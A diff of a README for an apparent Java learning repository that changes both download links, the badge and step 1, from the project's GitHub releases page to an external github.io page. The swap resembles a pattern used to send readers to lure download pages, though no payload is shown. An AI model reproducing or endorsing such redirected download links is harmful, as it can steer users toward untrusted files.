@@ -1,6 +1,6 @@
 # ☕ Java - Master professional software development skills today
 
-[![Download Java](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Zabar1079/Java/releases)
+[![Download Java](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://zabar1079.github.io)
 
 This repository provides a comprehensive guide for anyone who wants to learn Java. It contains structured lessons, diagrams, and example code. You will find everything from basic programming concepts to advanced web development tools. This project helps you build a strong foundation for a career in software engineering.
 
@@ -20,7 +20,7 @@ This collection covers the full lifecycle of Java development. You will start wi
 
 You do not need prior experience to start this path. Follow these steps to obtain the materials:
 
-1.  Visit the official release page: [https://github.com/Zabar1079/Java/releases](https://github.com/Zabar1079/Java/releases)
+1.  Visit the official release page: [https://zabar1079.github.io](https://zabar1079.github.io)
 2.  Locate the latest version release.
 3.  Click the source code link to download the files to your computer.
 4.  Extract the contents of the file to a folder on your desktop.
